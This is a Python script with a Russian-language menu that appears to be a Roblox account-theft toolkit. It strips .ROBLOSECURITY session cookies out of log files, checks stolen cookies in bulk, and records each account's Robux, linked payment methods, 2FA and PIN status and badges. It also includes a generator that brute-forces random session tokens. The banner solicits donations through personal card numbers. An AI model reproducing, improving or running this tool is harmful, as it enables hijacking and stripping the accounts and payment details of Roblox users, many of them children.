import os
import re
import requests
import configparser
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
from tqdm import tqdm
import asyncio
import aiohttp
import random
import string
import time

# Инициализация Colorama
init(autoreset=True)

# Красивая заставка с баннером
def print_banner():
    print(Fore.CYAN + Style.BRIGHT + """
     ███████╗██╗   ██╗███████╗███████╗███████╗ ██████╗ ███╗   ██╗ █████╗ 
     ╚══███╔╝██║   ██║╚══███╔╝╚══███╔╝██╔════╝██╔═══██╗████╗  ██║██╔══██╗
       ███╔╝ ██║   ██║  ███╔╝   ███╔╝ █████╗  ██║   ██║██╔██╗ ██║███████║
      ███╔╝  ██║   ██║ ███╔╝   ███╔╝  ██╔══╝  ██║   ██║██║╚██╗██║██╔══██║
     ███████╗╚██████╔╝███████╗███████╗███████╗╚██████╔╝██║ ╚████║██║  ██║
     ╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + "	Разработано: yato")
    print(Fore.YELLOW + "	Telegram: @yatocheck_bot")
    print(Fore.YELLOW + "Поддержите автора:")
    print(Fore.YELLOW + "YouMoney: 4100117726059185")
    print(Fore.YELLOW + "Mir: 2204120120569260\n")

# Очистка файлов от лишнего (куков)
def extract_warning_cookies(line: str) -> str:
    match = re.search(r'(_\|WARNING:.*?\|_.*?)(?=\s*$)', line)
    return match.group(1) if match else None

def process_file(input_file_path: str, output_file_path: str):
    try:
        with open(input_file_path, 'r', encoding='utf-8') as file:
            lines = file.readlines()
        cookies = [extract_warning_cookies(line) for line in lines if extract_warning_cookies(line)]
        with open(output_file_path, 'w', encoding='utf-8') as file:
            file.write("\n".join(cookies))
        print(Fore.GREEN + f"✅ Куки успешно извлечены и сохранены в файл: {output_file_path}")
    except Exception as e:
        print(Fore.RED + f"❌ Ошибка при обработке файла: {str(e)}")

# Чекер аккаунтов Roblox
def get_account_info(cookie):
    try:
        session = requests.Session()
        valid_check = session.get('https://economy.roblox.com/v1/user/currency', cookies={'.ROBLOSECURITY': cookie}, timeout=10)
        if valid_check.status_code != 200:
            return None
        settings_response = session.get("https://www.roblox.com/my/settings/json", cookies={".ROBLOSECURITY": cookie}, timeout=10).json()
        user_id = settings_response["UserId"]
        username = session.get('https://users.roblox.com/v1/users/authenticated', cookies={".ROBLOSECURITY": cookie}, timeout=10).json()['name']
        display_name = session.get('https://users.roblox.com/v1/users/authenticated', cookies={".ROBLOSECURITY": cookie}, timeout=10).json()['displayName']
        robux = valid_check.json()['robux']
        account_age = round(float(settings_response['AccountAgeInDays']) / 365, 2)
        two_factor = settings_response['MyAccountSecurityModel']['IsTwoStepEnabled']
        has_pin = settings_response['IsAccountPinEnabled']
        voice_chat = session.get('https://voice.roblox.com/v1/settings', cookies={'.ROBLOSECURITY': cookie}, timeout=10).json()['isVerifiedForVoice']
        email_verified = settings_response['IsEmailVerified']
        friends_count = session.get("https://friends.roblox.com/v1/my/friends/count", cookies={".ROBLOSECURITY": cookie}, timeout=10).json()["count"]
        is_above_13 = settings_response['UserAbove13']
        description = session.get(f'https://users.roblox.com/v1/description', cookies={'.ROBLOSECURITY': cookie}, timeout=10).json()['description']
        transactions_response = session.get(
            f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=10
        ).json()
        incoming_transactions = transactions_response.get('incomingRobuxTotal', 0)
        pending_robux = transactions_response.get('pendingRobuxTotal', 0)
        payment_methods_response = session.get(
            'https://billing.roblox.com/v1/paymentmethods',
            cookies={'.ROBLOSECURITY': cookie},
            timeout=10
        ).json()
        payment_methods = payment_methods_response.get('paymentMethods', [])
        payment_methods_info = ", ".join([method.get('friendlyName', 'Unknown') for method in payment_methods]) if payment_methods else "No payment methods linked"
        account_info = (
            f"Username:      {username}\n"
            f"Display Name:  {display_name}\n"
            f"Robux:         {robux} R$\n"
            f"Account Age:   {account_age} years\n"
            f"2FA Enabled:   {'Yes' if two_factor else 'No'}\n"
            f"PIN Enabled:   {'Yes' if has_pin else 'No'}\n"
            f"Voice Chat:    {'Enabled' if voice_chat else 'Disabled'}\n"
            f"Email Verified:{'Yes' if email_verified else 'No'}\n"
            f"Friends Count: {friends_count}\n"
            f"Above 13:      {'Yes' if is_above_13 else 'No'}\n"
            f"Description:   {description if description else 'No description available'}\n"
            f"Total Donations:{incoming_transactions} R$\n"
            f"Pending Robux: {pending_robux} R$\n"
            f"Payment Methods: {payment_methods_info}\n"
            f"User ID:       {user_id}\n"
            f"Cookie:        {cookie}\n"
        )
        return account_info
    except Exception as e:
        return None

def check_accounts(input_file_path: str, output_file_path: str):
    try:
        with open(input_file_path, 'r', encoding='utf-8') as file:
            cookies = file.read().splitlines()
        results = []
        total_cookies = len(cookies)
        
        # Запрос количества потоков у пользователя
        max_workers = int(input(Fore.YELLOW + "Введите количество потоков для проверки аккаунтов: ").strip())
        
        # Многопоточная проверка куков
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(get_account_info, cookie): cookie for cookie in cookies}
            for future in tqdm(as_completed(futures), total=total_cookies, desc="Проверка куков", unit="cookie"):
                result = future.result()
                if result:
                    results.append(result)
                    print(Fore.GREEN + result)
        with open(output_file_path, 'w', encoding='utf-8') as file:
            file.write("\n\n".join(results))
        print(Fore.GREEN + f"✅ Результаты успешно сохранены в файл: {output_file_path}")
    except Exception as e:
        print(Fore.RED + f"❌ Ошибка при сохранении результатов: {str(e)}")

# Бэйдж чекер
def badge_checker(input_file_path: str, output_file_path: str):
    config = configparser.ConfigParser()
    config.read("config.ini")
    badge_ids = [bid.strip() for bid in config["Settings"]["badges"].split(",")]
    try:
        with open(input_file_path, 'r', encoding='utf-8') as file:
            cookies = file.read().splitlines()
        results = []
        total_cookies = len(cookies)
        
        # Запрос количества потоков у пользователя
        max_workers = int(input(Fore.YELLOW + "Введите количество потоков для проверки бэйджей: ").strip())
        
        # Многопоточная проверка куков
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_badge, cookie, badge_ids): cookie for cookie in cookies}
            for future in tqdm(as_completed(futures), total=total_cookies, desc="Проверка бэйджей", unit="cookie"):
                result = future.result()
                if result:
                    results.append(result)
        with open(output_file_path, 'w', encoding='utf-8') as file:
            file.write("\n".join(results))
        print(Fore.GREEN + f"✅ Результаты записаны в файл: {output_file_path}")
    except Exception as e:
        print(Fore.RED + f"❌ Ошибка: {str(e)}")

def check_badge(cookie, badge_ids):
    max_retries = 3  # Максимальное количество попыток
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0'
    }
    session = requests.Session()
    for attempt in range(max_retries):
        try:
            response = session.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=10)
            if response.status_code == 200:
                user_id = str(response.json()["id"])
                badges_url = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100"
                badges_response = session.get(badges_url, headers=headers, timeout=10)
                if badges_response.status_code == 200:
                    badges_data = badges_response.json()
                    user_badges = {str(badge["id"]): badge["id"] for badge in badges_data.get("data", [])}  # Изменяем на ID бейджа
                    found_badges = [user_badges[badge_id] for badge_id in badge_ids if badge_id in user_badges]
                    if found_badges:
                        return f"{' | '.join(found_badges)} | {cookie}"
        except Exception as e:
            if attempt < max_retries - 1:
                continue  # Повторяем попытку
            else:
                return None
    return None

# Генератор куки
def generate_random_token():
    length = random.randint(1000, 1600)
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

async def is_valid_token(session, token):
    headers = {
        'Cookie': f'.ROBLOXSECURITY={token}',
        'User-Agent': 'Roblox/WinInet'
    }
    try:
        async with session.get('https://auth.roblox.com/v2/logout', headers=headers, timeout=5) as response:
            return response.status == 200
    except Exception:
        return False

def save_valid_tokens(tokens, file_path):
    with open(file_path, 'a') as file:
        for token in tokens:
            file.write(token + '\n')

async def run_cookie_generator():
    print("Введите путь для сохранения валидных токенов:")
    file_path = input().strip()
    # Создаем файл, если его нет
    if not os.path.exists(file_path):
        open(file_path, 'w').close()
    print("Введите количество токенов для генерации:")
    num_tokens = int(input().strip())
    print("Введите максимальное количество одновременных задач (рекомендуется от 200 до 500):")
    max_tasks = int(input().strip())
    valid_tokens = []
    checked_tokens = 0
    valid_count = 0
    # Переменные для отслеживания скорости
    start_time = time.time()
    last_checked = 0
    last_time = start_time
    semaphore = asyncio.Semaphore(max_tasks)  # Ограничиваем количество одновременных задач
    async def process_token():
        nonlocal checked_tokens, valid_count, last_checked, last_time
        async with semaphore:  # Контролируем количество одновременных задач
            token = generate_random_token()
            if await is_valid_token(session, token):
                valid_tokens.append(token)
                valid_count += 1
            checked_tokens += 1
            # Вычисляем скорость каждую секунду
            current_time = time.time()
            elapsed_time = current_time - last_time
            if elapsed_time >= 1:  # Обновляем скорость каждую секунду
                speed = (checked_tokens - last_checked) / elapsed_time
                print(f"Скорость: {speed:.2f} токенов/сек, Проверено: {checked_tokens}/{num_tokens}, Валидных: {valid_count}")
                last_checked = checked_tokens
                last_time = current_time
            # Сохраняем валидные токены каждые 5 найденных
            if len(valid_tokens) >= 5:
                save_valid_tokens(valid_tokens, file_path)
                valid_tokens.clear()
    # Создаем асинхронную сессию для HTTP-запросов
    async with aiohttp.ClientSession() as session:
        tasks = [process_token() for _ in range(num_tokens)]
        await asyncio.gather(*tasks)
    # Сохраняем оставшиеся валидные токены после завершения цикла
    if valid_tokens:
        save_valid_tokens(valid_tokens, file_path)
    total_time = time.time() - start_time
    print(f"Генерация завершена. Проверено: {checked_tokens}, Валидных: {valid_count}")
    print(f"Общее время выполнения: {total_time:.2f} сек")

# Главное меню
def main_menu():
    while True:
        print_banner()
        print(Fore.CYAN + "Выберите опцию:")
        print("1. Очистить файл с куками")
        print("2. Проверить аккаунты Roblox")
        print("3. Проверить бэйджи")
        print("4. Генератор куки")
        print("5. Выйти")
        choice = input(Fore.YELLOW + "Введите номер опции: ").strip()
        if choice == "1":
            input_file_path = input("Введите путь к исходному файлу: ").strip()
            output_file_path = input("Введите путь для сохранения очищенных куков: ").strip()
            process_file(input_file_path, output_file_path)
        elif choice == "2":
            input_file_path = input("Введите путь к файлу с куками: ").strip()
            output_file_path = input("Введите путь для сохранения результатов: ").strip()
            check_accounts(input_file_path, output_file_path)
        elif choice == "3":
            input_file_path = input("Введите путь к файлу с куками: ").strip()
            output_file_path = input("Введите путь для сохранения результатов: ").strip()
            badge_checker(input_file_path, output_file_path)
        elif choice == "4":
            asyncio.run(run_cookie_generator())
        elif choice == "5":
            print(Fore.GREEN + "Спасибо за использование программы!")
            break
        else:
            print(Fore.RED + "❌ Неверный выбор. Попробуйте снова.")

if __name__ == "__main__":
    main_menu()